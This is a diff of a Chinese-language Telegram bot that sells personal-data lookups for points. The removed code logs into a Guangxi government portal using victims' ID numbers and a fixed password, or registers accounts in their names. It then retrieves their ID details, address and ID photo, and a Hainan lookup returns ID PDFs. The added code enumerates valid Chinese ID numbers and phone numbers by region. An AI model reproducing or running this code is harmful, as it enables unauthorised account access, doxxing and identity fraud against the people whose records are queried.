-    sfz = item2.get("gmsfhm", "").strip()
-    mz = item2.get("mz", "").replace("族", "").strip()
-    qfjg = item2.get("issueD_UNIT", "").strip()
-    zz = item2.get("fulladdr", "").strip()
-    yxqq = item2.get("uL_FROM_DATE", "").replace("-", ".")
-    yxqz = item2.get("uL_END_DATE", "").replace("-", ".")
-    return f"姓名：{xm}\n身份证：{sfz}\n民族：{mz}\n有效期：{yxqq} 至 {yxqz}\n签发机关：{qfjg}\n地址：{zz}"
-
-# ---------- 广西入口（已扣费） ----------
-def gx_start(update, context):
-    context.user_data.clear()
-    uid = update.effective_user.id
-    ok, msg = deduct_points(uid, GX_COST, "（广西查询）")
-    if not ok:
-        update.message.reply_text(f"❌ {msg}，当前积分: {get_user_stats(uid)['points']:.2f}")
-        return
-    update.message.reply_text(f"✅ 已扣除 {GX_COST} 积分，开始广西查询流程。\n请输入姓名：")
-    return GX_NAME
-
-def gx_name(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    name = update.message.text.strip()
-    if not name:
-        update.message.reply_text("姓名不能为空，请重新输入：")
-        return GX_NAME
-    context.user_data['gx_name'] = name
-    update.message.reply_text("请输入18位身份证号：")
-    return GX_ID
-
-def gx_id(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    id_card = update.message.text.strip().upper()
-    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
-        update.message.reply_text("格式错误，请重新输入：")
-        return GX_ID
-    context.user_data['gx_id'] = id_card
-
-    session = requests.Session()
-    working_proxy = None
-    if os.environ.get('HTTP_PROXY'):
-        working_proxy = os.environ.get('HTTP_PROXY')
-        logger.info(f"使用环境变量代理: {working_proxy}")
-        session.proxies = {'http': working_proxy, 'https': working_proxy}
-    else:
-        working_proxy = load_working_proxy(max_tests=3, timeout_total=10)
-        if working_proxy:
-            session.proxies = {'http': f'http://{working_proxy}', 'https': f'http://{working_proxy}'}
-        else:
-            logger.warning("未启用代理，将直连")
-    session.get(GX_BASE_URL, headers=GX_HEADERS, timeout=10)
-    context.user_data['gx_session'] = session
-
-    update.message.reply_text("⏳ 正在检查账号状态...")
-    ok, msg = gx_login(session, id_card, GX_PASSWORD)
-    if ok:
-        update.message.reply_text("✅ 登录成功，正在获取信息...")
-        success, data = gx_query_photo(session, context.user_data['gx_name'], id_card)
-        if success:
-            item2 = data.get("item2", {})
-            if item2:
-                update.message.reply_text(gx_format_info(item2))
-            else:
-                update.message.reply_text("⚠️ 未获取到身份文字信息")
-            file_id = data.get("item1")
-            if file_id:
-                img_data = gx_download_photo(session, file_id)
-                if img_data:
-                    update.message.reply_photo(photo=io.BytesIO(img_data), caption="身份证照片")
-                else:
-                    update.message.reply_text("⚠️ 照片下载失败")
-        else:
-            update.message.reply_text(f"❌ 查询失败：{data}")
-        context.user_data.clear()
-        return ConversationHandler.END
-    else:
-        if "未注册" in msg or "不存在" in msg:
-            update.message.reply_text(f"⚠️ 检测到未注册：{msg}\n请输入手机号（用于注册）：")
-            return GX_PHONE
-        else:
-            update.message.reply_text(f"❌ 登录失败：{msg}\n可能密码错误或账号异常，流程终止。")
-            context.user_data.clear()
-            return ConversationHandler.END
-
-def gx_phone(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    phone = update.message.text.strip()
-    if not phone.isdigit() or len(phone) != 11:
-        update.message.reply_text("手机号必须是11位数字，请重新输入：")
-        return GX_PHONE
-    context.user_data['gx_phone'] = phone
-    update.message.reply_text("⏳ 正在获取验证码图片...")
-    session = context.user_data['gx_session']
-    img_b64, uuid = gx_get_captcha(session)
-    if not img_b64 or not uuid:
-        update.message.reply_text("❌ 获取图形验证码失败，请稍后重试")
-        context.user_data.clear()
-        return ConversationHandler.END
-    context.user_data['gx_uuid'] = uuid
-    try:
-        img_bytes = base64.b64decode(img_b64)
-        update.message.reply_photo(photo=io.BytesIO(img_bytes), caption="请查看上方验证码并输入（不区分大小写）")
-    except Exception as e:
-        update.message.reply_text(f"❌ 发送验证码图片失败：{e}")
-        context.user_data.clear()
-        return ConversationHandler.END
-    update.message.reply_text("请输入图形验证码：")
-    return GX_CAPTCHA
-
-def gx_captcha(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    captcha = update.message.text.strip().upper()
-    if not captcha:
-        update.message.reply_text("验证码不能为空，请重新输入：")
-        return GX_CAPTCHA
-    context.user_data['gx_captcha'] = captcha
-    phone = context.user_data['gx_phone']
-    uuid = context.user_data['gx_uuid']
-    session = context.user_data['gx_session']
-    update.message.reply_text("⏳ 正在发送短信验证码...")
-    ok, msg = gx_send_sms(session, phone, captcha, uuid)
-    if not ok:
-        update.message.reply_text(f"❌ 发送短信失败：{msg}\n流程终止")
-        context.user_data.clear()
-        return ConversationHandler.END
-    update.message.reply_text("✅ 短信已发送，请输入收到的6位数字验证码：")
-    return GX_SMS
-
-def gx_sms(update, context):
-    if update.message.text and update.message.text.startswith('/'):
-        context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消")
-        return ConversationHandler.END
-    sms_code = update.message.text.strip()
-    if not sms_code.isdigit() or len(sms_code) != 6:
-        update.message.reply_text("验证码必须是6位数字，请重新输入：")
-        return GX_SMS
-    name = context.user_data['gx_name']
-    id_card = context.user_data['gx_id']
-    phone = context.user_data['gx_phone']
-    captcha = context.user_data['gx_captcha']
-    session = context.user_data['gx_session']
-    update.message.reply_text("⏳ 正在注册账号...")
-    ok, msg = gx_register(session, phone, sms_code, captcha, name, id_card)
-    if not ok:
-        update.message.reply_text(f"❌ 注册失败：{msg}")
-        context.user_data.clear()
-        return ConversationHandler.END
-    update.message.reply_text("✅ 注册成功！正在登录并查询信息...")
-    ok2, msg2 = gx_login(session, id_card, GX_PASSWORD)
-    if not ok2:
-        update.message.reply_text(f"⚠️ 注册成功但登录失败：{msg2}，请稍后手动查询")
-        context.user_data.clear()
-        return ConversationHandler.END
-    success, data = gx_query_photo(session, name, id_card)
-    if success:
-        item2 = data.get("item2", {})
-        if item2:
-            update.message.reply_text(gx_format_info(item2))
-        else:
-            update.message.reply_text("⚠️ 未获取到身份文字信息")
-        file_id = data.get("item1")
-        if file_id:
-            img_data = gx_download_photo(session, file_id)
-            if img_data:
-                update.message.reply_photo(photo=io.BytesIO(img_data), caption="身份证照片")
-            else:
-                update.message.reply_text("⚠️ 照片下载失败")
-    else:
-        update.message.reply_text(f"❌ 查询失败：{data}")
-    context.user_data.clear()
-    return ConversationHandler.END
-
-# ===== /hn 海南查询（已改1积分） =====
-def hn(update, context):
-    context.user_data.clear()
-    args=context.args
-    if not args:
-        update.message.reply_text("❌ 格式错误\n正确格式：/hn <身份证号>")
-        return
-    id_card=args[0].strip()
-    if len(id_card)!=18:
-        update.message.reply_text("❌ 身份证号必须为18位")
-        return
-    uid=update.effective_user.id
-    ok, msg = deduct_points(uid, HN_COST, "（海南查询）")
-    if not ok:
-        update.message.reply_text(f"❌ {msg}，当前积分: {get_user_stats(uid)['points']:.2f}")
-        return
-    update.message.reply_text(f"⏳ 正在查询海南系统...（已扣 {HN_COST} 积分）")
-    success, result = query_id_card_sync(id_card)
-    if success:
-        context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO(result), filename=f"{id_card}.pdf", caption="✅ 查询成功")
-    else:
-        update.message.reply_text(f"❌ 查询失败：{result}")
-
 # ===== /khzc 空号检测 =====
 def khzc_start(update, context):
     context.user_data.clear()
@@ -1638,15 +946,392 @@ def khzc_phone(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
+# ============================================================================
+# 新增免费功能 1：/sjhsc 手机号段生成器
+# ============================================================================
+PROVINCE_CITY_DB = {
+    "北京市": ["北京市"], "天津市": ["天津市"], "上海市": ["上海市"], "重庆市": ["重庆市"],
+    "河北省": ["石家庄市", "唐山市", "秦皇岛市", "邯郸市", "邢台市", "保定市", "张家口市", "承德市", "沧州市", "廊坊市", "衡水市"],
+    "山西省": ["太原市", "大同市", "阳泉市", "长治市", "晋城市", "朔州市", "晋中市", "运城市", "忻州市", "临汾市", "吕梁市"],
+    "内蒙古自治区": ["呼和浩特市", "包头市", "乌海市", "赤峰市", "通辽市", "鄂尔多斯市", "呼伦贝尔市", "巴彦淖尔市", "乌兰察布市"],
+    "辽宁省": ["沈阳市", "大连市", "鞍山市", "抚顺市", "本溪市", "丹东市", "锦州市", "营口市", "阜新市", "辽阳市", "盘锦市", "铁岭市", "朝阳市", "葫芦岛市"],
+    "吉林省": ["长春市", "吉林市", "四平市", "辽源市", "通化市", "白山市", "松原市", "白城市"],
+    "黑龙江省": ["哈尔滨市", "齐齐哈尔市", "鸡西市", "鹤岗市", "双鸭山市", "大庆市", "伊春市", "佳木斯市", "七台河市", "牡丹江市", "黑河市", "绥化市"],
+    "江苏省": ["南京市", "无锡市", "徐州市", "常州市", "苏州市", "南通市", "连云港市", "淮安市", "盐城市", "扬州市", "镇江市", "泰州市", "宿迁市"],
+    "浙江省": ["杭州市", "宁波市", "温州市", "嘉兴市", "湖州市", "绍兴市", "金华市", "衢州市", "舟山市", "台州市", "丽水市"],
+    "安徽省": ["合肥市", "芜湖市", "蚌埠市", "淮南市", "马鞍山市", "淮北市", "铜陵市", "安庆市", "黄山市", "滁州市", "阜阳市", "宿州市", "六安市", "亳州市", "池州市", "宣城市"],
+    "福建省": ["福州市", "厦门市", "莆田市", "三明市", "泉州市", "漳州市", "南平市", "龙岩市", "宁德市"],
+    "江西省": ["南昌市", "景德镇市", "萍乡市", "九江市", "新余市", "鹰潭市", "赣州市", "吉安市", "宜春市", "抚州市", "上饶市"],
+    "山东省": ["济南市", "青岛市", "淄博市", "枣庄市", "东营市", "烟台市", "潍坊市", "济宁市", "泰安市", "威海市", "日照市", "临沂市", "德州市", "聊城市", "滨州市", "菏泽市"],
+    "河南省": ["郑州市", "开封市", "洛阳市", "平顶山市", "安阳市", "鹤壁市", "新乡市", "焦作市", "濮阳市", "许昌市", "漯河市", "三门峡市", "南阳市", "商丘市", "信阳市", "周口市", "驻马店市"],
+    "湖北省": ["武汉市", "黄石市", "十堰市", "宜昌市", "襄阳市", "鄂州市", "荆门市", "孝感市", "荆州市", "黄冈市", "咸宁市", "随州市"],
+    "湖南省": ["长沙市", "株洲市", "湘潭市", "衡阳市", "邵阳市", "岳阳市", "常德市", "张家界市", "益阳市", "郴州市", "永州市", "怀化市", "娄底市"],
+    "广东省": ["广州市", "深圳市", "珠海市", "汕头市", "佛山市", "韶关市", "湛江市", "肇庆市", "江门市", "茂名市", "惠州市", "梅州市", "汕尾市", "河源市", "阳江市", "清远市", "东莞市", "中山市", "潮州市", "揭阳市", "云浮市"],
+    "广西壮族自治区": ["南宁市", "柳州市", "桂林市", "梧州市", "北海市", "防城港市", "钦州市", "贵港市", "玉林市", "百色市", "贺州市", "河池市", "来宾市", "崇左市"],
+    "海南省": ["海口市", "三亚市", "三沙市", "儋州市"],
+    "四川省": ["成都市", "自贡市", "攀枝花市", "泸州市", "德阳市", "绵阳市", "广元市", "遂宁市", "内江市", "乐山市", "南充市", "眉山市", "宜宾市", "广安市", "达州市", "雅安市", "巴中市", "资阳市"],
+    "贵州省": ["贵阳市", "六盘水市", "遵义市", "安顺市", "毕节市", "铜仁市"],
+    "云南省": ["昆明市", "曲靖市", "玉溪市", "保山市", "昭通市", "丽江市", "普洱市", "临沧市"],
+    "西藏自治区": ["拉萨市", "日喀则市", "昌都市", "林芝市", "山南市", "那曲市"],
+    "陕西省": ["西安市", "铜川市", "宝鸡市", "咸阳市", "渭南市", "延安市", "汉中市", "榆林市", "安康市", "商洛市"],
+    "甘肃省": ["兰州市", "嘉峪关市", "金昌市", "白银市", "天水市", "武威市", "张掖市", "平凉市", "酒泉市", "庆阳市", "定西市", "陇南市"],
+    "青海省": ["西宁市", "海东市"],
+    "宁夏回族自治区": ["银川市", "石嘴山市", "吴忠市", "固原市", "中卫市"],
+    "新疆维吾尔自治区": ["乌鲁木齐市", "克拉玛依市", "吐鲁番市", "哈密市"],
+    "台湾省": ["台北市", "新北市", "桃园市", "台中市", "台南市", "高雄市"],
+    "香港特别行政区": ["香港特别行政区"],
+    "澳门特别行政区": ["澳门特别行政区"],
+}
+PHONE_PREFIXES = {
+    "移动": ["134","135","136","137","138","139","147","150","151","152","157","158","159","172","178","182","183","184","187","188","195","197","198"],
+    "联通": ["130","131","132","145","155","156","166","175","176","185","186","196"],
+    "电信": ["133","149","153","173","177","180","181","189","190","191","193","199"],
+    "虚拟": ["162","165","167","170","171"],
+}
+
+class PhoneGenerator:
+    def __init__(self):
+        self.all_cities = self._build_city_index()
+    def _build_city_index(self):
+        index = {}
+        for province, cities in PROVINCE_CITY_DB.items():
+            for city in cities:
+                index[city] = province
+        return index
+    def validate_pattern(self, pattern):
+        cleaned = re.sub(r'[^0-9xX]', '', pattern)
+        if len(cleaned) != 11:
+            return False, f"手机号必须是11位 (当前{len(cleaned)}位)", []
+        x_positions = [i for i, char in enumerate(cleaned) if char.lower() == 'x']
+        if not x_positions:
+            return False, "模板中必须包含至少一个x作为模糊位", []
+        if len(x_positions) > 8:
+            return False, "模糊位过多,建议不超过8位", []
+        return True, cleaned, x_positions
+    def find_location(self, query):
+        query = query.strip()
+        if query in PROVINCE_CITY_DB:
+            if query in ["北京市","天津市","上海市","重庆市"]:
+                return (query, query)
+            return (query, "")
+        for province, cities in PROVINCE_CITY_DB.items():
+            for city in cities:
+                if query in city or city in query:
+                    return (province, city)
+        for province, cities in PROVINCE_CITY_DB.items():
+            if query in province:
+                return (province, "")
+            for city in cities:
+                if query in city.replace("市","").replace("省",""):
+                    return (province, city)
+        return None
+    def generate_numbers(self, pattern, x_positions):
+        numbers = []
+        num_x = len(x_positions)
+        for i in range(10 ** num_x):
+            num_str = str(i).zfill(num_x)
+            phone_list = list(pattern)
+            for idx, pos in enumerate(x_positions):
+                phone_list[pos] = num_str[idx]
+            numbers.append(''.join(phone_list))
+        return numbers
+    def filter_by_prefix(self, numbers):
+        result = {"移动": [], "联通": [], "电信": [], "虚拟": [], "未知": []}
+        for num in numbers:
+            prefix = num[:3]
+            found = False
+            for operator, prefixes in PHONE_PREFIXES.items():
+                if prefix in prefixes:
+                    result[operator].append(num)
+                    found = True
+                    break
+            if not found:
+                result["未知"].append(num)
+        return result
+
+def sjhsc_start(update, context):
+    context.user_data.clear()
+    update.message.reply_text("📱 请输入手机号模板（如 130xxxxxx08，x为模糊位）：")
+    return SJHSC_TEMPLATE
+
+def sjhsc_template(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    pattern = update.message.text.strip()
+    gen = PhoneGenerator()
+    is_valid, msg, x_positions = gen.validate_pattern(pattern)
+    if not is_valid:
+        update.message.reply_text(f"❌ {msg}\n请重新输入：")
+        return SJHSC_TEMPLATE
+    context.user_data['sjhsc_pattern'] = msg
+    context.user_data['sjhsc_xpos'] = x_positions
+    update.message.reply_text(f"✅ 模板有效，将生成 {10**len(x_positions)} 个号码\n📍 请输入目标地区（如：安徽省阜阳市）：")
+    return SJHSC_LOCATION
+
+def sjhsc_location(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    location = update.message.text.strip()
+    gen = PhoneGenerator()
+    result = gen.find_location(location)
+    if not result:
+        update.message.reply_text("❌ 未找到该地区，请重新输入：")
+        return SJHSC_LOCATION
+    province, city = result
+    full_location = f"{province}{city}" if city else province
+    context.user_data['sjhsc_location'] = full_location
+    update.message.reply_text(f"⏳ 正在生成，请稍候...")
+    try:
+        numbers = gen.generate_numbers(context.user_data['sjhsc_pattern'], context.user_data['sjhsc_xpos'])
+        if not numbers:
+            update.message.reply_text("❌ 生成失败，请检查模板。")
+            return ConversationHandler.END
+        # 分类统计
+        categorized = gen.filter_by_prefix(numbers)
+        stats_lines = [f"📍 地区：{full_location}", f"📊 共生成 {len(numbers)} 个号码"]
+        for op, nums in categorized.items():
+            if nums:
+                stats_lines.append(f"  {op}：{len(nums)} 个")
+        stats_text = "\n".join(stats_lines)
+        # 生成txt文件
+        content = "\n".join(numbers)
+        bio = io.BytesIO(content.encode('utf-8'))
+        bio.name = "sjhsc_list.txt"
+        update.message.reply_document(document=bio, filename="sjhsc_list.txt", caption=f"✅ 生成完成\n{stats_text}")
+    except Exception as e:
+        update.message.reply_text(f"❌ 生成出错：{e}")
+    finally:
+        context.user_data.clear()
+    return ConversationHandler.END
+
+# ============================================================================
+# 新增免费功能 2：/sfzsc 身份证号列表生成器
+# ============================================================================
+DQM_API_URL = "https://xiaowunb.top/dqm.json"
+diquma = {}
+
+def init_diquma():
+    global diquma
+    try:
+        headers = {"User-Agent": "Mozilla/5.0"}
+        req = urllib.request.Request(DQM_API_URL, headers=headers)
+        with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=10) as resp:
+            resp_data = json.loads(resp.read().decode("utf-8"))
+        if isinstance(resp_data, dict):
+            diquma = resp_data
+            print(f"🟢 地区码加载成功:{len(diquma)} 条")
+        else:
+            print("🔴 地区码数据格式错误")
+    except Exception as e:
+        print(f"🔴 地区码加载失败:{e}")
+
+def address_lookup(pattern):
+    pattern = pattern.lower().replace('x', r'\d')
+    regex = re.compile(f'^{pattern}$')
+    return [code for code in diquma.keys() if regex.match(code)]
+
+def calculate_check_digit(first_17):
+    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+    check_chars = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
+    try:
+        s = sum(int(first_17[i]) * weights[i] for i in range(17))
+        return check_chars[s % 11]
+    except:
+        return None
+
+def generate_ids(card_template, gender=None):
+    card = card_template.lower()
+    if len(card) != 18:
+        print("❌ 长度必须为18位")
+        return []
+
+    addr_pat = card[:6]
+    year_pat = card[6:10]
+    mon_pat = card[10:12]
+    day_pat = card[12:14]
+    seq_pat = card[14:17]
+    check_pat = card[17]
+
+    if 'x' in addr_pat:
+        addr_list = address_lookup(addr_pat)
+        if not addr_list:
+            print("❌ 未匹配到地区码")
+            return []
+        print(f"🏢 匹配到 {len(addr_list)} 个地区")
+    else:
+        addr_list = [addr_pat]
+        print(f"🏢 地区:{diquma.get(addr_pat, '未知')}")
+
+    if 'x' in year_pat:
+        # 交互式输入年份范围（在机器人中我们固定为1990-2005以减少计算量，或提示用户）
+        yr_input = "1990-2005"  # 此处做简化，实际可让用户输入
+        y1, y2 = 1990, 2005
+        year_range = (y1, y2)
+    else:
+        year_range = (int(year_pat), int(year_pat))
+
+    mon_digits = []
+    for i, ch in enumerate(mon_pat):
+        if ch == 'x':
+            mon_digits.append(['0', '1'] if i == 0 else list('0123456789'))
+        else:
+            mon_digits.append([ch])
+
+    day_digits = []
+    for i, ch in enumerate(day_pat):
+        if ch == 'x':
+            day_digits.append(['0', '1', '2', '3'] if i == 0 else list('0123456789'))
+        else:
+            day_digits.append([ch])
+
+    if gender not in ['男', '女']:
+        if seq_pat[-1] != 'x':
+            last = seq_pat[-1]
+            gender = '男' if last in '13579' else '女' if last in '02468' else None
+        else:
+            gender = None
+
+    seq_digits = []
+    for i, ch in enumerate(seq_pat):
+        if ch == 'x':
+            if i == 2:
+                if gender == '男':
+                    seq_digits.append(['1', '3', '5', '7', '9'])
+                elif gender == '女':
+                    seq_digits.append(['0', '2', '4', '6', '8'])
+                else:
+                    seq_digits.append(list('0123456789'))
+            else:
+                seq_digits.append(list('0123456789'))
+        else:
+            seq_digits.append([ch])
+
+    total = len(addr_list) * (year_range[1]-year_range[0]+1) * \
+            len(list(itertools.product(*mon_digits))) * \
+            len(list(itertools.product(*day_digits))) * \
+            (1 if seq_pat[-1] != 'x' and gender else 10 if not gender else 5)
+    print(f"📊 总组合数约为 {total}")
+
+    valid = set()
+    processed = 0
+    start = time.time()
+
+    for addr in addr_list:
+        for year in range(year_range[0], year_range[1]+1):
+            y_str = str(year)
+            for m_combo in itertools.product(*mon_digits):
+                m_str = ''.join(m_combo)
+                m_int = int(m_str)
+                if m_int < 1 or m_int > 12:
+                    continue
+                if m_int in (4,6,9,11):
+                    max_d = 30
+                elif m_int == 2:
+                    max_d = 29 if ((year%4==0 and year%100!=0) or (year%400==0)) else 28
+                else:
+                    max_d = 31
+                for d_combo in itertools.product(*day_digits):
+                    d_str = ''.join(d_combo)
+                    d_int = int(d_str)
+                    if d_int < 1 or d_int > max_d:
+                        continue
+                    for s_combo in itertools.product(*seq_digits):
+                        s_str = ''.join(s_combo)
+                        first17 = addr + y_str + m_str + d_str + s_str
+                        check = calculate_check_digit(first17)
+                        if check is None:
+                            continue
+                        if check_pat != 'x' and check.upper() != check_pat.upper():
+                            continue
+                        full_id = first17 + check
+                        valid.add(full_id)
+                        processed += 1
+                        if processed % 1000 == 0:
+                            print(f"⏳ 已生成 {processed} 个...")
+
+    print(f"✅ 生成完成,耗时 {time.time()-start:.2f} 秒,共 {len(valid)} 个有效身份证")
+    return list(valid)
+
+def sfzsc_start(update, context):
+    context.user_data.clear()
+    update.message.reply_text("📝 请输入姓名（仅用于显示，不影响生成）：")
+    return SFZSC_NAME
+
+def sfzsc_name(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    name = update.message.text.strip()
+    if not name:
+        update.message.reply_text("姓名不能为空，请重新输入：")
+        return SFZSC_NAME
+    context.user_data['sfzsc_name'] = name
+    update.message.reply_text("🔢 请输入18位身份证模板（x为通配符，如 1101011990xxxx123X）：")
+    return SFZSC_TEMPLATE
+
+def sfzsc_template(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    template = update.message.text.strip()
+    if len(template) != 18:
+        update.message.reply_text("❌ 必须为18位，请重新输入：")
+        return SFZSC_TEMPLATE
+    if not all(c in '0123456789xX' for c in template):
+        update.message.reply_text("❌ 只能包含数字和 x/X，请重新输入：")
+        return SFZSC_TEMPLATE
+    if len(template.replace('x','').replace('X','')) < 6:
+        update.message.reply_text("❌ 至少输入6位已知数字，请重新输入：")
+        return SFZSC_TEMPLATE
+    context.user_data['sfzsc_template'] = template
+    update.message.reply_text("👤 请输入性别（男/女，直接回车表示未知）：")
+    return SFZSC_GENDER
+
+def sfzsc_gender(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    gender = update.message.text.strip()
+    if gender not in ['男', '女']:
+        gender = None
+    template = context.user_data.get('sfzsc_template')
+    name = context.user_data.get('sfzsc_name', '用户')
+    if not template:
+        update.message.reply_text("❌ 会话已过期，请重新 /sfzsc")
+        return ConversationHandler.END
+    update.message.reply_text(f"⏳ {name}，正在生成身份证号，请稍候...")
+    try:
+        valid_ids = generate_ids(template, gender)
+        if not valid_ids:
+            update.message.reply_text("❌ 未生成任何有效身份证号，请检查模板。")
+            return ConversationHandler.END
+        content = "\n".join(valid_ids)
+        bio = io.BytesIO(content.encode('utf-8'))
+        bio.name = "sfz_list.txt"
+        update.message.reply_document(document=bio, filename="sfz_list.txt", caption=f"✅ {name}，共生成 {len(valid_ids)} 个身份证号")
+    except Exception as e:
+        update.message.reply_text(f"❌ 生成出错：{e}")
+    finally:
+        context.user_data.clear()
+    return ConversationHandler.END
+
 # ===== 主程序 =====
 def main():
     global bot
+    # 初始化地区码（用于 sfzsc）
+    init_diquma()
     updater=Updater(BOT_TOKEN, request_kwargs={'read_timeout':60,'connect_timeout':30})
     bot=updater.bot
     dp=updater.dispatcher
 
     dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("hn", hn))
     dp.add_handler(CommandHandler("cx", cx))
     dp.add_handler(CommandHandler("qd", qd))
     dp.add_handler(CommandHandler("zs", zs))
@@ -1706,46 +1391,31 @@ def main():
         allow_reentry=True
     ))
 
-    # ---------- 新增：/3ys 三要素核验 ----------
-    dp.add_handler(ConversationHandler(
-        entry_points=[CommandHandler('3ys', three_start)],
-        states={
-            THREE_NAME: [MessageHandler(Filters.text & ~Filters.command, three_name)],
-            THREE_PHONE: [MessageHandler(Filters.text & ~Filters.command, three_phone)],
-            THREE_ID: [MessageHandler(Filters.text & ~Filters.command, three_id)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel)],
-        allow_reentry=True
-    ))
-
-    dp.add_handler(ConversationHandler(
-        entry_points=[CommandHandler('sms', sms_start)],
-        states={
-            SMS_CHOICE: [
-                CallbackQueryHandler(sms_choice_callback, pattern='^sms_'),
-                MessageHandler(Filters.text & ~Filters.command, sms_phone_input)
-            ]
-        },
-        fallbacks=[CommandHandler('cancel', cancel)],
-        allow_reentry=True
-    ))
-
-    dp.add_handler(ConversationHandler(
-        entry_points=[CommandHandler('gx', gx_start)],
-        states={
-            GX_NAME: [MessageHandler(Filters.text & ~Filters.command, gx_name)],
-            GX_ID: [MessageHandler(Filters.text & ~Filters.command, gx_id)],
-            GX_PHONE: [MessageHandler(Filters.text & ~Filters.command, gx_phone)],
-            GX_CAPTCHA: [MessageHandler(Filters.text & ~Filters.command, gx_captcha)],
-            GX_SMS: [MessageHandler(Filters.text & ~Filters.command, gx_sms)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel)],
-        allow_reentry=True
-    ))
-
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('khzc', khzc_start)],
         states={KHZC_PHONE: [MessageHandler(Filters.text & ~Filters.command, khzc_phone)]},
+        fallbacks=[CommandHandler('cancel', cancel)],
+        allow_reentry=True
+    ))
+
+    # ---------- 新增免费命令 ----------
+    dp.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('sjhsc', sjhsc_start)],
+        states={
+            SJHSC_TEMPLATE: [MessageHandler(Filters.text & ~Filters.command, sjhsc_template)],
+            SJHSC_LOCATION: [MessageHandler(Filters.text & ~Filters.command, sjhsc_location)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+        allow_reentry=True
+    ))
+
+    dp.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('sfzsc', sfzsc_start)],
+        states={
+            SFZSC_NAME: [MessageHandler(Filters.text & ~Filters.command, sfzsc_name)],
+            SFZSC_TEMPLATE: [MessageHandler(Filters.text & ~Filters.command, sfzsc_template)],
+            SFZSC_GENDER: [MessageHandler(Filters.text & ~Filters.command, sfzsc_gender)],
+        },
         fallbacks=[CommandHandler('cancel', cancel)],
         allow_reentry=True
     ))
